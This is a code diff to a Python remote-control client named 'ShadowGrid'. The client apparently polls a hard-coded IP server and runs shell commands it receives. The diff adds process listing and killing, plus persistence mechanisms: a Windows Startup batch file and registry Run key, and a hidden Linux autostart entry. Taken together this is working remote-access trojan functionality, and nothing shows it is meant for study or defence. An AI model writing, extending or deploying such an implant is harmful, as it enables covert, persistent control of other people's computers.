@@ -30,6 +30,11 @@ try:
 except ImportError:
     ImageGrab = None
 
+try:
+    import psutil
+except ImportError:
+    psutil = None
+
 SERVER_URL = "https://113.45.254.80:8444"
 SERVER_HOST = "0.0.0.0"
 SERVER_PORT = 8444
@@ -246,6 +251,154 @@ def handle(cmd):
             result = subprocess.run(p, shell=True, capture_output=True, text=True, timeout=30)
             output = result.stdout + result.stderr
             return {"status": "ok", "result": output, "result_type": "shell"}
+        except Exception as e:
+            return {"status": "error", "result": str(e), "result_type": "error"}
+
+    if t in ("ps", "process"):
+        if not psutil:
+            return {"status":"error","result":"psutil module not available","result_type":"error"}
+        try:
+            processes = []
+            for proc in psutil.process_iter(['pid', 'name', 'username', 'status']):
+                try:
+                    processes.append(proc.info)
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    pass
+            return {"status":"ok","result":processes,"result_type":"process_list"}
+        except Exception as e:
+            return {"status":"error","result":str(e),"result_type":"error"}
+
+    if t == "kill":
+        if not psutil:
+            return {"status":"error","result":"psutil module not available","result_type":"error"}
+        pid = None
+        try:
+            if isinstance(p, dict) and p.get("pid") is not None:
+                pid_val = p.get("pid")
+                if isinstance(pid_val, str) and pid_val.isdigit():
+                    pid = int(pid_val)
+                elif isinstance(pid_val, int):
+                    pid = int(pid_val)
+                else:
+                    pid = None
+            elif isinstance(p, str) and p.isdigit():
+                pid = int(p)
+            elif isinstance(p, int):
+                pid = p
+            else:
+                pid = None
+            
+            if pid is None:
+                return {"status":"error","result":"PID must be a valid integer","result_type":"error"}
+                
+            if not isinstance(pid, int) or pid <= 0:
+                return {"status":"error","result":"PID must be a positive integer","result_type":"error"}
+            
+            proc = psutil.Process(pid)
+            proc.terminate()
+            proc.wait(timeout=5)
+            return {"status": "ok", "result": f"Process {pid} terminated successfully", "result_type": "process_killed"}
+        except psutil.NoSuchProcess:
+            return {"status":"error","result":f"No process with PID {pid}","result_type":"error"} if pid else {"status":"error","result":"No process with specified PID","result_type":"error"}
+        except psutil.AccessDenied:
+            return {"status":"error","result":f"Access denied to kill process {pid}","result_type":"error"} if pid else {"status":"error","result":"Access denied to kill process","result_type":"error"}
+        except TypeError:
+            return {"status":"error","result":"PID must be a valid integer","result_type":"error"}
+        except ValueError:
+            return {"status":"error","result":"PID must be a valid integer","result_type":"error"}
+        except Exception as e:
+            return {"status":"error","result":str(e),"result_type":"error"}
+
+    if t in ("persist", "install"):
+        try:
+            import sys
+            import platform
+            from pathlib import Path
+            
+            action = p.get("action", "install") if isinstance(p, dict) else "install"
+            target_path = p.get("path", "") if isinstance(p, dict) else ""
+            
+            current_exe = sys.argv[0]
+            
+            # 获取用户主目录
+            home_dir = str(Path.home())
+            
+            if platform.system() == "Windows":
+                import winreg
+                
+                startup_folder = Path(home_dir) / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
+                
+                if action == "install":
+                    # 复制客户端到指定目录（如果提供）
+                    if target_path:
+                        import shutil
+                        client_dest = Path(target_path) / "shadowgrid-client.exe" 
+                        if not Path(target_path).exists():
+                            os.makedirs(target_path, exist_ok=True)
+                        
+                        # 只能在开发环境中复制当前脚本，实际运行时应为编译后的可执行文件
+                        # 因此我们创建一个批处理文件作为替代方案
+                        startup_script = f"""@echo off
+    echo Waiting for network...
+    ping 127.0.0.1 -n 10 > NUL
+    cd /d "{Path(current_exe).parent}"
+    python "{current_exe}" > "C:\\Windows\\Temp\\sg-client.log" 2>&1
+    """
+                        startup_script_path = startup_folder / "shadowgrid-startup.bat"
+                        startup_script_path.write_text(startup_script)
+                        
+                        # 添加到注册表
+                        key_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+                        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
+                            winreg.SetValueEx(key, "ShadowGridClient", 0, winreg.REG_SZ, str(startup_script_path))
+                    
+                    return {"status": "ok", "result": "Client persistence configured", "result_type": "persistence"}
+                
+                elif action == "remove":
+                    # 移除启动项
+                    try:
+                        startup_script = startup_folder / "shadowgrid-startup.bat"
+                        if startup_script.exists():
+                            startup_script.unlink()
+                        
+                        key_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+                        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS) as key:
+                            winreg.DeleteValue(key, "ShadowGridClient")
+                    except Exception:
+                        pass
+                    
+                    return {"status": "ok", "result": "Client persistence removed", "result_type": "persistence"}
+            
+            else:  # Linux/macOS
+                if action == "install":
+                    autostart_dir = Path(home_dir) / ".config" / "autostart"
+                    autostart_dir.mkdir(parents=True, exist_ok=True)
+                    
+                    # 创建desktop文件
+                    desktop_content = f"""[Desktop Entry]
+Type=Application
+Name=ShadowGrid Client
+Exec=python3 {current_exe}
+Hidden=false
+NoDisplay=true
+X-GNOME-Autostart-enabled=true
+Comment=ShadowGrid Remote Management Client
+"""
+                    
+                    desktop_file = autostart_dir / "shadowgrid-client.desktop"
+                    desktop_file.write_text(desktop_content)
+                    
+                    return {"status": "ok", "result": "Client persistence configured", "result_type": "persistence"}
+                
+                elif action == "remove":
+                    autostart_file = Path(home_dir) / ".config" / "autostart" / "shadowgrid-client.desktop"
+                    if autostart_file.exists():
+                        autostart_file.unlink()
+                    
+                    return {"status": "ok", "result": "Client persistence removed", "result_type": "persistence"}
+            
+            return {"status": "ok", "result": f"Action '{action}' completed", "result_type": "persistence"}
+                
         except Exception as e:
             return {"status": "error", "result": str(e), "result_type": "error"}
 
